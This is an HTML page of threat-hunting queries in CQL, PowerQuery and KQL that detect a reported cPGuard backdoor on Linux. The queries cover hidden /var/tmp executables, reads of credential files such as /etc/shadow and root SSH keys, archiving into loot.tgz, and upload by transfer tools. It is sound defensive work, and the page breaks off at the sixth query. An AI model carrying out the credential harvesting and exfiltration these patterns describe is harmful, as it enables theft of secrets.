+<div class="rosetta-query-shell" data-siem-rosetta-version="1.3" data-rosetta-query-id="cql3"><div class="rosetta-release"><span class="rosetta-badge level">Validation: schema-aligned, static-reviewed</span><span class="rosetta-badge">Automated: static-passed</span><span class="rosetta-badge">Equivalence: approximate-analytic</span><span class="rosetta-badge">Profiles: microsoft-defender-xdr, sentinelone-endpoint-ocsf</span></div><details class="rosetta-details"><summary>Known limitations and deployment notes</summary><ul><li>PowerQuery: No ELF-content filter exists, so hidden non-executable files also match.</li><li>PowerQuery: File modifications of an existing hidden file are not covered; only creations.</li><li>PowerQuery assumes: endpoint.os holds the lowercase value linux.</li><li>PowerQuery assumes: The CQL second branch is case-sensitive; matches here is case-insensitive, which only widens it slightly.</li><li>KQL – Defender XDR: No ELF-content filter exists, so hidden non-executable files also match.</li><li>KQL – Defender XDR: Modifications of an existing hidden file are not covered; only creations.</li><li>KQL – Defender XDR assumes: FolderPath holds the full path of the written file on Linux sensors.</li><li>KQL – Defender XDR assumes: FileCreated is the action recorded for a new file.</li></ul></details><div class="rosetta-controls"><div class="rosetta-tabs" role="tablist" aria-label="SIEM query language"><button type="button" class="rosetta-tab" role="tab" id="cql3-tab" aria-controls="cql3-pane" aria-selected="true" data-language="cql" tabindex="0" onclick="rosettaSwitch(this)">CQL</button><button type="button" class="rosetta-tab" role="tab" id="powerquery3-tab" aria-controls="powerquery3-pane" aria-selected="false" data-language="powerquery" tabindex="-1" onclick="rosettaSwitch(this)">PowerQuery</button><button type="button" class="rosetta-tab" role="tab" id="kql3-tab" aria-controls="kql3-pane" aria-selected="false" data-language="kql" tabindex="-1" onclick="rosettaSwitch(this)">KQL – Defender XDR</button></div><div class="rosetta-controls-end"><button type="button" class="rosetta-open-s1" hidden onclick="rosettaOpenS1(this)" title="SentinelOne does not document a link that pre-fills a query: this copies the query and opens your console">Copy &amp; open SentinelOne</button><button type="button" class="rosetta-open-def" hidden onclick="rosettaOpenDefender(this)" title="Microsoft documents a Share link in the portal but not its URL format: this copies the query and opens Advanced hunting">Copy &amp; open Defender</button><button type="button" class="rosetta-fallback-copy" data-rosetta-copy-label="Copy CQL" onclick="rosettaCopy(this)">Copy CQL</button></div></div><div class="rosetta-pane" data-lang="cql" id="cql3-pane" role="tabpanel" aria-labelledby="cql3-tab"><pre class="cql" id="cql3"><span class="cm">// HUNT: Hidden ELF written under /var/tmp (cPGuard backdoor shell path and generic dotfile executables)</span>
+<span class="cm">// MITRE: T1564.001, T1105</span>
+<span class="cm">// CONF: medium  FP: medium  COST: low | REQUIRES: Linux executable-write telemetry (ElfFileWritten)</span>
+<span class="cm">// FALSE POSITIVES: installers and package scripts that stage hidden helper binaries in /var/tmp</span>
+<span class="cm">// TUNING: after a 30 day baseline, drop the generic second branch for known installers by adding</span>
+<span class="cm">//         | ContextBaseFileName != /^(rpm|dpkg|yum|dnf|apt|apt-get|cpanel_pkg)$/i  (confirm the field on your sensor)</span>
+<span class="cm">// NOTE: the exact backdoor path is /var/tmp/.cpg91511_sh per the OPSSHIELD advisory</span>
+#event_simpleName=ElfFileWritten
+| event_platform=Lin
+| TargetFileName=/^\/var\/tmp\/\.cpg\d+/i or TargetFileName=/^\/var\/tmp\/\.[^\/]+$/
+| table([@timestamp, ComputerName, aid, TargetFileName, SHA256HashData, ContextProcessId])</pre></div><div class="rosetta-pane" data-lang="powerquery" id="powerquery3-pane" role="tabpanel" aria-labelledby="powerquery3-tab" hidden><details class="rosetta-requirements"><summary>3 required fields · View requirements</summary><div class="rosetta-requirements-body"><section><h4>Required telemetry</h4><ul><li>File Creation</li></ul></section><section><h4>Required fields</h4><ul><li><code>event.type</code>: Event type</li><li><code>endpoint.os</code>: Endpoint OS</li><li><code>tgt.file.path</code>: Created file path</li></ul></section><section><h4>Recommended fields</h4><ul><li><code>src.process.name</code>: Writing process</li></ul></section><section><h4>Optional fields</h4><ul><li><code>tgt.file.sha256</code>: File hash. Population varies by agent version.</li></ul></section><section><h4>Fallbacks</h4><ul><li><code>endpoint.name</code> → <code>agent.uuid</code>: Changes the displayed host identifier only.</li></ul></section><section class="rosetta-readiness"><div class="rosetta-readiness-head"><h4>Readiness test</h4><button type="button" class="rosetta-readiness-copy" onclick="rosettaCopyReadiness(this)">Copy readiness test</button></div><pre class="rosetta-readiness-code" data-rosetta-ignore="true">event.type = &#x27;File Creation&#x27; endpoint.os = &#x27;linux&#x27; tgt.file.path = *
+| limit 5
+| columns event.time, endpoint.name, tgt.file.path</pre></section></div></details><pre class="siem-code powerquery" id="powerquery3" data-language="powerquery" data-rosetta-query-id="cql3">// HUNT: Hidden ELF written under /var/tmp (cPGuard backdoor shell path and generic dotfile executables)
+// SCHEMA PROFILE: sentinelone-endpoint-ocsf
+// MITRE: T1564.001, T1105
+// CONF: medium | FP: medium
+// FALSE POSITIVES: installers and package scripts that stage hidden helper binaries in /var/tmp
+// EQUIVALENCE: approximate-analytic - The CQL uses a Falcon executable-write event that fires only for ELF content. SentinelOne has no ELF-specific file event, so this hunts any file created in the same hidden /var/tmp locations. It is broader than the CQL and will return hidden non-executable files too.
+// REQUIRES: SentinelOne Deep Visibility file-creation events from Linux agents
+// TUNING: After a 30 day baseline, exclude package managers and installers by src.process.name; the CQL TUNING comment names the same idea.
+// LOOKBACK: 7d; set the console time picker, extend to 30d for the incident window
+// CONFIGURATION: No lookup objects required.
+// KNOWN GAPS: No ELF-content filter exists, so hidden non-executable files also match. File modifications of an existing hidden file are not covered; only creations.
+// VALIDATION LEVEL: static-reviewed
+event.type = &#x27;File Creation&#x27; endpoint.os = &#x27;linux&#x27; (tgt.file.path matches &#x27;^/var/tmp/\\.cpg\\d+&#x27; or tgt.file.path matches &#x27;^/var/tmp/\\.[^/]+$&#x27;)
+| columns event.time, endpoint.name, agent.uuid, tgt.file.path, tgt.file.sha256, src.process.name, src.process.pid
+| sort -event.time
+| limit 200</pre></div><div class="rosetta-pane" data-lang="kql" id="kql3-pane" role="tabpanel" aria-labelledby="kql3-tab" hidden><details class="rosetta-automated-validation" data-status="static-passed"><summary>Automated validation: static-passed</summary><div class="rosetta-automated-validation-body"><div>Static schema: passed (0 errors, 0 warnings)</div><div>Positive fixtures: 0/0 · Benign fixtures: 0/0</div><div>Evidence: recorded in the build's validation report (not published)</div><div>Checked: 2026-11-04T12:27:51Z · siem-query-rosetta-kql-validator/1.0.0</div></div></details><details class="rosetta-requirements"><summary>3 required fields · View requirements</summary><div class="rosetta-requirements-body"><section><h4>Required telemetry</h4><ul><li>DeviceFileEvents</li></ul></section><section><h4>Required fields</h4><ul><li><code>Timestamp</code>: Event time</li><li><code>ActionType</code>: Action</li><li><code>FolderPath</code>: Written file path</li></ul></section><section><h4>Recommended fields</h4><ul><li><code>InitiatingProcessFileName</code>: Writing process</li></ul></section><section><h4>Optional fields</h4><ul><li><code>SHA1</code>: Hash. SHA256 is often unpopulated; SHA1 is the safer pivot.</li></ul></section><section><h4>Fallbacks</h4><ul><li><code>DeviceName</code> → <code>DeviceId</code>: Changes the displayed host identifier only.</li></ul></section><section class="rosetta-readiness"><div class="rosetta-readiness-head"><h4>Readiness test</h4><button type="button" class="rosetta-readiness-copy" onclick="rosettaCopyReadiness(this)">Copy readiness test</button></div><pre class="rosetta-readiness-code" data-rosetta-ignore="true">DeviceFileEvents
+| where Timestamp &gt; ago(1d)
+| project Timestamp, ActionType, FolderPath
+| take 5</pre></section></div></details><pre class="siem-code kql" id="kql3" data-language="kql" data-rosetta-query-id="cql3">// HUNT: Hidden ELF written under /var/tmp (cPGuard backdoor shell path and generic dotfile executables)
+// SCHEMA PROFILE: microsoft-defender-xdr
+// MITRE: T1564.001, T1105
+// CONF: medium | FP: medium
+// FALSE POSITIVES: installers and package scripts that stage hidden helper binaries in /var/tmp
+// EQUIVALENCE: approximate-analytic - The CQL uses a Falcon executable-write event that fires only for ELF content. DeviceFileEvents has no ELF-specific action, so this hunts any file created in the same hidden /var/tmp locations. It is broader than the CQL and will return hidden non-executable files too.
+// REQUIRES: Defender for Endpoint on Linux file telemetry (DeviceFileEvents)
+// TUNING: After a 30 day baseline, exclude package managers and installers by InitiatingProcessFileName.
+// LOOKBACK: 7d; extend to 30d for the incident window
+// CONFIGURATION: No lookup objects required.
+// KNOWN GAPS: No ELF-content filter exists, so hidden non-executable files also match. Modifications of an existing hidden file are not covered; only creations.
+// VALIDATION LEVEL: schema-aligned
+// AUTOMATED VALIDATION: static-passed; static=passed; fixtures=0/0
+DeviceFileEvents
+| where Timestamp &gt;= ago(7d)
+| where ActionType == &quot;FileCreated&quot;
+| where FolderPath matches regex @&quot;(?i)^/var/tmp/\.cpg\d+&quot; or FolderPath matches regex @&quot;^/var/tmp/\.[^/]+$&quot;
+| project Timestamp, ReportId, DeviceId, DeviceName, ActionType, FolderPath, FileName, SHA1, SHA256, InitiatingProcessId, InitiatingProcessFileName
+| sort by Timestamp desc
+| take 200</pre></div></div>
+      </div>
+    </div>
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q4 &middot; Credential-file harvesting commands from one parent (shadow, root SSH, my.cnf, history)</span>
+        <div class="qc-badges"><span class="badge b-med">CONF MEDIUM</span><span class="badge b-med">FP MEDIUM</span><span class="badge b-med">COST MEDIUM</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql4',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql4')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> Counts processes under the same parent that name two or more of the files the vendor says the script collected: <code>/etc/shadow</code>, <code>/etc/passwd</code>, root's SSH authorization and known-hosts files, root's <code>my.cnf</code> and root's shell history. A script doing the harvest produces several sibling commands under one parent, which is the signal. File reads by shell builtins produce no process event, so a quiet result is not clearance. <strong>FP:</strong> backup agents, configuration management and compliance scanners read the same files.</p>
+<div class="rosetta-query-shell" data-siem-rosetta-version="1.3" data-rosetta-query-id="cql4"><div class="rosetta-release"><span class="rosetta-badge level">Validation: schema-aligned, static-reviewed</span><span class="rosetta-badge">Automated: static-passed</span><span class="rosetta-badge">Equivalence: equivalent-with-schema-assumptions</span><span class="rosetta-badge">Profiles: microsoft-defender-xdr, sentinelone-endpoint-ocsf</span></div><details class="rosetta-details"><summary>Known limitations and deployment notes</summary><ul><li>PowerQuery: Reads done inside the shell with builtins and redirects create no process and are not counted.</li><li>PowerQuery: any() returns one sample per group, not the full list the CQL collects.</li><li>PowerQuery assumes: endpoint.os holds the lowercase value linux.</li><li>PowerQuery assumes: src.process.pid identifies the creator within one endpoint and short window; PID reuse over a long window can merge two creators.</li><li>KQL – Defender XDR: Reads done inside the shell with builtins and redirects create no process and are not counted.</li><li>KQL – Defender XDR assumes: DeviceProcessEvents has no operating system column, so no Linux filter is applied; the credential paths are Linux-specific.</li><li>KQL – Defender XDR assumes: InitiatingProcessId identifies the creator within one device and short window; PID reuse over a long window can merge two creators.</li></ul></details><div class="rosetta-controls"><div class="rosetta-tabs" role="tablist" aria-label="SIEM query language"><button type="button" class="rosetta-tab" role="tab" id="cql4-tab" aria-controls="cql4-pane" aria-selected="true" data-language="cql" tabindex="0" onclick="rosettaSwitch(this)">CQL</button><button type="button" class="rosetta-tab" role="tab" id="powerquery4-tab" aria-controls="powerquery4-pane" aria-selected="false" data-language="powerquery" tabindex="-1" onclick="rosettaSwitch(this)">PowerQuery</button><button type="button" class="rosetta-tab" role="tab" id="kql4-tab" aria-controls="kql4-pane" aria-selected="false" data-language="kql" tabindex="-1" onclick="rosettaSwitch(this)">KQL – Defender XDR</button></div><div class="rosetta-controls-end"><button type="button" class="rosetta-open-s1" hidden onclick="rosettaOpenS1(this)" title="SentinelOne does not document a link that pre-fills a query: this copies the query and opens your console">Copy &amp; open SentinelOne</button><button type="button" class="rosetta-open-def" hidden onclick="rosettaOpenDefender(this)" title="Microsoft documents a Share link in the portal but not its URL format: this copies the query and opens Advanced hunting">Copy &amp; open Defender</button><button type="button" class="rosetta-fallback-copy" data-rosetta-copy-label="Copy CQL" onclick="rosettaCopy(this)">Copy CQL</button></div></div><div class="rosetta-pane" data-lang="cql" id="cql4-pane" role="tabpanel" aria-labelledby="cql4-tab"><pre class="cql" id="cql4"><span class="cm">// HUNT: Multiple root credential-file reads from one parent process (cPGuard script collection step)</span>
+<span class="cm">// MITRE: T1003.008, T1552.001, T1552.003, T1552.004</span>
+<span class="cm">// CONF: medium  FP: medium  COST: medium | REQUIRES: Linux process creation with command line (ProcessRollup2)</span>
+<span class="cm">// FALSE POSITIVES: backup agents, configuration management, compliance and audit scanners</span>
+<span class="cm">// TUNING: exclude known tooling after baselining, e.g. add before groupBy:</span>
+<span class="cm">//         | ParentBaseFileName != /^(ansible-playbook|puppet|chef-client|salt-minion|rsnapshot|borg)$/i</span>
+<span class="cm">// NOTE: reads done inside the shell with builtins and redirects do not create a process, so this under-counts</span>
+#event_simpleName=/^(ProcessRollup2|SyntheticProcessRollup2)$/
+| event_platform=Lin
+| CommandLine=/(\/etc\/shadow|\/etc\/passwd|\/root\/\.ssh\/(authorized_keys|known_hosts)|\/root\/\.my\.cnf|\/root\/\.bash_history)/i
+| groupBy([aid, ComputerName, ParentProcessId], function=[count(as=credCmds), min(@timestamp, as=firstSeen), max(@timestamp, as=lastSeen), collect([FileName, CommandLine, ParentBaseFileName], limit=20)])
+| credCmds &gt;= 2</pre></div><div class="rosetta-pane" data-lang="powerquery" id="powerquery4-pane" role="tabpanel" aria-labelledby="powerquery4-tab" hidden><details class="rosetta-requirements"><summary>6 required fields · View requirements</summary><div class="rosetta-requirements-body"><section><h4>Required telemetry</h4><ul><li>Process Creation</li></ul></section><section><h4>Required fields</h4><ul><li><code>event.type</code>: Event type</li><li><code>endpoint.os</code>: Endpoint OS</li><li><code>tgt.process.cmdline</code>: Created command line</li><li><code>agent.uuid</code>: Endpoint identifier</li><li><code>src.process.pid</code>: Creator process ID</li><li><code>event.time</code>: Event time</li></ul></section><section><h4>Recommended fields</h4><ul><li><code>src.process.name</code>: Creator process</li></ul></section><section><h4>Fallbacks</h4><ul><li><code>endpoint.name</code> → <code>agent.uuid</code>: Changes the displayed host identifier only.</li></ul></section><section class="rosetta-readiness"><div class="rosetta-readiness-head"><h4>Readiness test</h4><button type="button" class="rosetta-readiness-copy" onclick="rosettaCopyReadiness(this)">Copy readiness test</button></div><pre class="rosetta-readiness-code" data-rosetta-ignore="true">event.type = &#x27;Process Creation&#x27; endpoint.os = &#x27;linux&#x27; tgt.process.cmdline = * src.process.pid = *
+| limit 5
+| columns event.time, agent.uuid, endpoint.name, src.process.pid, tgt.process.cmdline</pre></section></div></details><pre class="siem-code powerquery" id="powerquery4" data-language="powerquery" data-rosetta-query-id="cql4">// HUNT: Multiple root credential-file reads from one parent process (cPGuard script collection step)
+// SCHEMA PROFILE: sentinelone-endpoint-ocsf
+// MITRE: T1003.008, T1552.001, T1552.003, T1552.004
+// CONF: medium | FP: medium
+// FALSE POSITIVES: backup agents, configuration management, compliance and audit scanners
+// EQUIVALENCE: equivalent-with-schema-assumptions - Same predicate and threshold: two or more credential-file command lines sharing one creator process on one endpoint. The creator is src.process.pid on a process-creation event. matches is case-insensitive, which reproduces the CQL /i intent.
+// REQUIRES: SentinelOne Deep Visibility process-creation events from Linux agents
+// TUNING: Exclude known configuration management and backup tooling by creator name after baselining.
+// LOOKBACK: 7d; set the console time picker, extend to 30d for the incident window
+// CONFIGURATION: No lookup objects required.
+// KNOWN GAPS: Reads done inside the shell with builtins and redirects create no process and are not counted. any() returns one sample per group, not the full list the CQL collects.
+// VALIDATION LEVEL: static-reviewed
+event.type = &#x27;Process Creation&#x27; endpoint.os = &#x27;linux&#x27; tgt.process.cmdline matches &#x27;(/etc/shadow|/etc/passwd|/root/\\.ssh/(authorized_keys|known_hosts)|/root/\\.my\\.cnf|/root/\\.bash_history)&#x27;
+| group cred_cmds=count(), first_seen=min(event.time), last_seen=max(event.time), tool=any(tgt.process.name), sample_cmdline=any(tgt.process.cmdline), creator=any(src.process.name) by agent.uuid, endpoint.name, src.process.pid
+| filter cred_cmds &gt;= 2
+| sort -cred_cmds
+| limit 200</pre></div><div class="rosetta-pane" data-lang="kql" id="kql4-pane" role="tabpanel" aria-labelledby="kql4-tab" hidden><details class="rosetta-automated-validation" data-status="static-passed"><summary>Automated validation: static-passed</summary><div class="rosetta-automated-validation-body"><div>Static schema: passed-with-warnings (0 errors, 1 warnings)</div><div>Positive fixtures: 0/0 · Benign fixtures: 0/0</div><div>Evidence: recorded in the build's validation report (not published)</div><div>Checked: 2026-11-04T12:27:51Z · siem-query-rosetta-kql-validator/1.0.0</div></div></details><details class="rosetta-requirements"><summary>4 required fields · View requirements</summary><div class="rosetta-requirements-body"><section><h4>Required telemetry</h4><ul><li>DeviceProcessEvents</li></ul></section><section><h4>Required fields</h4><ul><li><code>Timestamp</code>: Event time</li><li><code>ProcessCommandLine</code>: Created command line</li><li><code>DeviceId</code>: Device identifier</li><li><code>InitiatingProcessId</code>: Initiating process ID</li></ul></section><section><h4>Recommended fields</h4><ul><li><code>InitiatingProcessFileName</code>: Initiating process</li></ul></section><section><h4>Fallbacks</h4><ul><li><code>DeviceName</code> → <code>DeviceId</code>: Changes the displayed host identifier only.</li></ul></section><section class="rosetta-readiness"><div class="rosetta-readiness-head"><h4>Readiness test</h4><button type="button" class="rosetta-readiness-copy" onclick="rosettaCopyReadiness(this)">Copy readiness test</button></div><pre class="rosetta-readiness-code" data-rosetta-ignore="true">DeviceProcessEvents
+| where Timestamp &gt; ago(1d)
+| project Timestamp, DeviceId, InitiatingProcessId, ProcessCommandLine
+| take 5</pre></section></div></details><pre class="siem-code kql" id="kql4" data-language="kql" data-rosetta-query-id="cql4">// HUNT: Multiple root credential-file reads from one parent process (cPGuard script collection step)
+// SCHEMA PROFILE: microsoft-defender-xdr
+// MITRE: T1003.008, T1552.001, T1552.003, T1552.004
+// CONF: medium | FP: medium
+// FALSE POSITIVES: backup agents, configuration management, compliance and audit scanners
+// EQUIVALENCE: equivalent-with-schema-assumptions - Same predicate and threshold: two or more credential-file command lines sharing one initiating process on one device. matches regex with (?i) reproduces the CQL /i intent.
+// REQUIRES: Defender for Endpoint on Linux process-creation telemetry (DeviceProcessEvents)
+// TUNING: Exclude known configuration management and backup tooling by initiating process name after baselining.
+// LOOKBACK: 7d; extend to 30d for the incident window
+// CONFIGURATION: No lookup objects required.
+// KNOWN GAPS: Reads done inside the shell with builtins and redirects create no process and are not counted.
+// VALIDATION LEVEL: schema-aligned
+// AUTOMATED VALIDATION: static-passed; static=passed-with-warnings; fixtures=0/0
+DeviceProcessEvents
+| where Timestamp &gt;= ago(7d)
+| where ProcessCommandLine matches regex @&quot;(?i)(/etc/shadow|/etc/passwd|/root/\.ssh/(authorized_keys|known_hosts)|/root/\.my\.cnf|/root/\.bash_history)&quot;
+| summarize CredCmds = count(), FirstSeen = min(Timestamp), LastSeen = max(Timestamp), FileNames = make_set(FileName, 20), CommandLines = make_set(ProcessCommandLine, 20), Initiators = make_set(InitiatingProcessFileName, 20) by DeviceId, DeviceName, InitiatingProcessId
+| where CredCmds &gt;= 2
+| sort by LastSeen desc
+| take 200</pre></div></div>
+      </div>
+    </div>
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q5 &middot; Loot archive staging (tar, gzip, zip against the hidden directory or loot.tgz)</span>
+        <div class="qc-badges"><span class="badge b-low">CONF HIGH</span><span class="badge b-low">FP LOW</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql5',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql5')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> Looks for archive utilities building or touching <code>/var/tmp/.cpg91511/loot.tgz</code> or any <code>/var/tmp/.cpg&lt;digits&gt;</code> directory. <strong>FP:</strong> none known.</p>
+<div class="rosetta-query-shell" data-siem-rosetta-version="1.3" data-rosetta-query-id="cql5"><div class="rosetta-release"><span class="rosetta-badge level">Validation: schema-aligned, static-reviewed</span><span class="rosetta-badge">Automated: static-passed</span><span class="rosetta-badge">Equivalence: equivalent-with-schema-assumptions</span><span class="rosetta-badge">Profiles: microsoft-defender-xdr, sentinelone-endpoint-ocsf</span></div><details class="rosetta-details"><summary>Known limitations and deployment notes</summary><ul><li>PowerQuery: An archive built inside a script interpreter library without launching a tool is not captured.</li><li>PowerQuery assumes: endpoint.os holds the lowercase value linux.</li><li>PowerQuery assumes: tgt.process.name holds the basename of the executed archive tool.</li><li>KQL – Defender XDR: An archive built inside a script interpreter library without launching a tool is not captured.</li><li>KQL – Defender XDR assumes: DeviceProcessEvents has no operating system column, so no Linux filter is applied; the archive path is Linux-specific.</li><li>KQL – Defender XDR assumes: FileName holds the basename of the executed archive tool.</li></ul></details><div class="rosetta-controls"><div class="rosetta-tabs" role="tablist" aria-label="SIEM query language"><button type="button" class="rosetta-tab" role="tab" id="cql5-tab" aria-controls="cql5-pane" aria-selected="true" data-language="cql" tabindex="0" onclick="rosettaSwitch(this)">CQL</button><button type="button" class="rosetta-tab" role="tab" id="powerquery5-tab" aria-controls="powerquery5-pane" aria-selected="false" data-language="powerquery" tabindex="-1" onclick="rosettaSwitch(this)">PowerQuery</button><button type="button" class="rosetta-tab" role="tab" id="kql5-tab" aria-controls="kql5-pane" aria-selected="false" data-language="kql" tabindex="-1" onclick="rosettaSwitch(this)">KQL – Defender XDR</button></div><div class="rosetta-controls-end"><button type="button" class="rosetta-open-s1" hidden onclick="rosettaOpenS1(this)" title="SentinelOne does not document a link that pre-fills a query: this copies the query and opens your console">Copy &amp; open SentinelOne</button><button type="button" class="rosetta-open-def" hidden onclick="rosettaOpenDefender(this)" title="Microsoft documents a Share link in the portal but not its URL format: this copies the query and opens Advanced hunting">Copy &amp; open Defender</button><button type="button" class="rosetta-fallback-copy" data-rosetta-copy-label="Copy CQL" onclick="rosettaCopy(this)">Copy CQL</button></div></div><div class="rosetta-pane" data-lang="cql" id="cql5-pane" role="tabpanel" aria-labelledby="cql5-tab"><pre class="cql" id="cql5"><span class="cm">// HUNT: cPGuard credential loot archive staged in the hidden directory</span>
+<span class="cm">// MITRE: T1074.001, T1560.001</span>
+<span class="cm">// CONF: high  FP: low  COST: low | REQUIRES: Linux process creation with command line (ProcessRollup2)</span>
+<span class="cm">// SOURCE: /var/tmp/.cpg91511/loot.tgz (OPSSHIELD advisory; The Hacker News)</span>
+#event_simpleName=/^(ProcessRollup2|SyntheticProcessRollup2)$/
+| event_platform=Lin
+| FileName=/^(tar|gzip|pigz|zip|7z|7za|bsdtar|cpio)$/i
+| CommandLine=/(loot\.tgz|\/var\/tmp\/\.cpg\d+)/i
+| table([@timestamp, ComputerName, aid, UserName, FileName, CommandLine, ParentBaseFileName, ImageFileName])</pre></div><div class="rosetta-pane" data-lang="powerquery" id="powerquery5-pane" role="tabpanel" aria-labelledby="powerquery5-tab" hidden><details class="rosetta-requirements"><summary>4 required fields · View requirements</summary><div class="rosetta-requirements-body"><section><h4>Required telemetry</h4><ul><li>Process Creation</li></ul></section><section><h4>Required fields</h4><ul><li><code>event.type</code>: Event type</li><li><code>endpoint.os</code>: Endpoint OS</li><li><code>tgt.process.name</code>: Created process name</li><li><code>tgt.process.cmdline</code>: Created command line</li></ul></section><section><h4>Recommended fields</h4><ul><li><code>src.process.name</code>: Creator process</li></ul></section><section><h4>Fallbacks</h4><ul><li><code>endpoint.name</code> → <code>agent.uuid</code>: Changes the displayed host identifier only.</li></ul></section><section class="rosetta-readiness"><div class="rosetta-readiness-head"><h4>Readiness test</h4><button type="button" class="rosetta-readiness-copy" onclick="rosettaCopyReadiness(this)">Copy readiness test</button></div><pre class="rosetta-readiness-code" data-rosetta-ignore="true">event.type = &#x27;Process Creation&#x27; endpoint.os = &#x27;linux&#x27; tgt.process.name = * tgt.process.cmdline = *
+| limit 5
+| columns event.time, endpoint.name, tgt.process.name, tgt.process.cmdline</pre></section></div></details><pre class="siem-code powerquery" id="powerquery5" data-language="powerquery" data-rosetta-query-id="cql5">// HUNT: cPGuard credential loot archive staged in the hidden directory
+// SCHEMA PROFILE: sentinelone-endpoint-ocsf
+// MITRE: T1074.001, T1560.001
+// CONF: high | FP: low
+// EQUIVALENCE: equivalent-with-schema-assumptions - Same process-creation predicate: an archive tool by created process name whose command line names loot.tgz or the hidden collection directory. in:anycase and contains are case-insensitive, which reproduces the CQL /i intent.
+// REQUIRES: SentinelOne Deep Visibility process-creation events from Linux agents
+// TUNING: None expected; the hidden directory name is specific to this campaign.
+// LOOKBACK: 7d; set the console time picker, extend to 30d for the incident window
+// CONFIGURATION: No lookup objects required.
+// KNOWN GAPS: An archive built inside a script interpreter library without launching a tool is not captured.
+// VALIDATION LEVEL: static-reviewed
+event.type = &#x27;Process Creation&#x27; endpoint.os = &#x27;linux&#x27; tgt.process.name in:anycase (&#x27;tar&#x27;, &#x27;gzip&#x27;, &#x27;pigz&#x27;, &#x27;zip&#x27;, &#x27;7z&#x27;, &#x27;7za&#x27;, &#x27;bsdtar&#x27;, &#x27;cpio&#x27;) (tgt.process.cmdline contains &#x27;loot.tgz&#x27; or tgt.process.cmdline matches &#x27;/var/tmp/\\.cpg\\d+&#x27;)
+| columns event.time, endpoint.name, agent.uuid, src.process.user, tgt.process.name, tgt.process.cmdline, src.process.name, tgt.process.image.path
+| sort -event.time
+| limit 200</pre></div><div class="rosetta-pane" data-lang="kql" id="kql5-pane" role="tabpanel" aria-labelledby="kql5-tab" hidden><details class="rosetta-automated-validation" data-status="static-passed"><summary>Automated validation: static-passed</summary><div class="rosetta-automated-validation-body"><div>Static schema: passed (0 errors, 0 warnings)</div><div>Positive fixtures: 0/0 · Benign fixtures: 0/0</div><div>Evidence: recorded in the build's validation report (not published)</div><div>Checked: 2026-11-04T12:27:51Z · siem-query-rosetta-kql-validator/1.0.0</div></div></details><details class="rosetta-requirements"><summary>3 required fields · View requirements</summary><div class="rosetta-requirements-body"><section><h4>Required telemetry</h4><ul><li>DeviceProcessEvents</li></ul></section><section><h4>Required fields</h4><ul><li><code>Timestamp</code>: Event time</li><li><code>FileName</code>: Created process name</li><li><code>ProcessCommandLine</code>: Created command line</li></ul></section><section><h4>Recommended fields</h4><ul><li><code>InitiatingProcessFileName</code>: Creator process</li></ul></section><section><h4>Fallbacks</h4><ul><li><code>DeviceName</code> → <code>DeviceId</code>: Changes the displayed host identifier only.</li></ul></section><section class="rosetta-readiness"><div class="rosetta-readiness-head"><h4>Readiness test</h4><button type="button" class="rosetta-readiness-copy" onclick="rosettaCopyReadiness(this)">Copy readiness test</button></div><pre class="rosetta-readiness-code" data-rosetta-ignore="true">DeviceProcessEvents
+| where Timestamp &gt; ago(1d)
+| project Timestamp, FileName, ProcessCommandLine
+| take 5</pre></section></div></details><pre class="siem-code kql" id="kql5" data-language="kql" data-rosetta-query-id="cql5">// HUNT: cPGuard credential loot archive staged in the hidden directory
+// SCHEMA PROFILE: microsoft-defender-xdr
+// MITRE: T1074.001, T1560.001
+// CONF: high | FP: low
+// EQUIVALENCE: equivalent-with-schema-assumptions - Same process-creation predicate: an archive tool by created process name whose command line names loot.tgz or the hidden collection directory. in~ and contains are case-insensitive, which reproduces the CQL /i intent.
+// REQUIRES: Defender for Endpoint on Linux process-creation telemetry (DeviceProcessEvents)
+// TUNING: None expected; the hidden directory name is specific to this campaign.
+// LOOKBACK: 7d; extend to 30d for the incident window
+// CONFIGURATION: No lookup objects required.
+// KNOWN GAPS: An archive built inside a script interpreter library without launching a tool is not captured.
+// VALIDATION LEVEL: schema-aligned
+// AUTOMATED VALIDATION: static-passed; static=passed; fixtures=0/0
+DeviceProcessEvents
+| where Timestamp &gt;= ago(7d)
+| where FileName in~ (&quot;tar&quot;, &quot;gzip&quot;, &quot;pigz&quot;, &quot;zip&quot;, &quot;7z&quot;, &quot;7za&quot;, &quot;bsdtar&quot;, &quot;cpio&quot;)
+| where ProcessCommandLine contains &quot;loot.tgz&quot; or ProcessCommandLine matches regex @&quot;(?i)/var/tmp/\.cpg\d+&quot;
+| project Timestamp, ReportId, DeviceId, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, FolderPath
+| sort by Timestamp desc
+| take 200</pre></div></div>
+      </div>
+    </div>
+    <div class="query-card">
+      <div class="qc-header">
+        <span class="qc-title">Q6 &middot; Transfer tool referencing the loot archive or hidden directory (upload)</span>
+        <div class="qc-badges"><span class="badge b-med">CONF MEDIUM</span><span class="badge b-low">FP LOW</span><span class="badge b-low">COST LOW</span></div>
+        <div class="qc-actions">
+          <button class="btn-copy" onclick="copyQuery('cql6',this)">Copy CQL</button>
+          <button class="btn-falcon" onclick="openFalcon('cql6')">Open in Falcon</button>
+        </div>
+      </div>
+      <div class="qc-body">
+        <p><strong>Looks for:</strong> Looks for <code>curl</code>, <code>wget</code>, scripting runtimes or copy tools whose command line references <code>loot.tgz</code> or the hidden <code>/var/tmp/.cpg&lt;digits&gt;</code> directory, which is how the archive would reach the licensing server. The upload method and destination host are not published, so this tests the command line only; if the script uses a runtime library with the path built at run time, the string will not appear. <strong>FP:</strong> none known.</p>
